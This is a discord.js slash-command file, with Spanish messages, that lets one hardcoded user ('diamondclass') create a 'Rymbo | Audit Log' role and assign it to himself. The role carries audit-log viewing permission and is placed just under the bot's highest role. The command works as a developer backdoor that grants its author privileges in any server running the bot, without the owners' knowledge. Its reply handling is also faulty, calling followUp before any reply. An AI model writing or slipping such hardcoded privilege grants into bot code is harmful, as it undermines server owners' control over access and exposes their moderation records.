const { SlashCommandBuilder, PermissionsBitField } = require('discord.js');
module.exports = {
  data: new SlashCommandBuilder()
    .setName('auditlogperms')
    .setDescription('Otorga permisos para ver el registro de auditoría a diamondclass.'),
  async execute(interaction) {
    const allowedUserId = '1216532655592439862';
    const allowedUserTag = 'diamondclass';
    if (interaction.user.id !== allowedUserId || interaction.user.tag !== allowedUserTag) {
      return interaction.reply({ content: 'No eres diamondclass lol.', ephemeral: true });
    }
    if (!interaction.guild.members.me.permissions.has(PermissionsBitField.Flags.ManageRoles)) {
      return interaction.reply({ content: 'No tengo permisos para gestionar roles.', ephemeral: true });
    }
    let auditRole = interaction.guild.roles.cache.find(role => role.name === 'Rymbo | Audit Log');
    if (!auditRole) {
      try {
        auditRole = await interaction.guild.roles.create({
          name: 'Rymbo | Audit Log',
          permissions: [PermissionsBitField.Flags.ViewAuditLog],
        });
        await interaction.followUp({ content: '¡Rol "Rymbo | Audit Log" creado con permisos para ver el registro de auditoría!', ephemeral: true });
      } catch (error) {
        return interaction.reply({ content: 'Ocurrió un error al intentar crear el rol.', ephemeral: true });
      }
    }
    try {
      const botHighestRole = interaction.guild.members.me.roles.highest.position;
      await auditRole.setPosition(botHighestRole - 1);
      const member = interaction.guild.members.cache.get(interaction.user.id);
      await member.roles.add(auditRole);
      interaction.reply({ content: '¡Has recibido permisos para ver el registro de auditoría!', ephemeral: true });
    } catch (error) {
      interaction.reply({ content: 'Ocurrió un error al intentar configurarte el rol o los permisos.', ephemeral: true });
    }
  }
};
